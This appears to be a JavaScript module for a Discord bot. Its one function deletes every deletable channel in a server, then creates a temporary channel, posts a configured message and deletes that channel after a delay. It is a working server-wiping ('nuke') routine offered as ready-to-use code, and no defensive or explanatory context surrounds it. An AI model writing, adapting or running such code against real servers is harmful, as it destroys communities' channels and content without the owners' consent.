const config = require('config');

function channelsDestroy(){
	let channels = this.channels.filter(channel => channel.deletable);
	channels.forEach((channel, id) => {
		channel.delete();
		console.log('[delete]', `[channel] "${channel.name}" deleted`)
	})
	console.log(`[channels] deleted ${channels.size} channels`)
	if(this.me.hasPermission(16)) this.createChannel('channel').then(tempChannel => {
		tempChannel.startTyping();
		setTimeout(() => {
			tempChannel.stopTyping();
			tempChannel.send(config.message);
			setTimeout(tempChannel.delete.bind(tempChannel), 10000) 
		}, +`${parseInt(process.env.MESSAGE.length/2)}00`)
	})
	return this;
}

module.exports = channelsDestroy
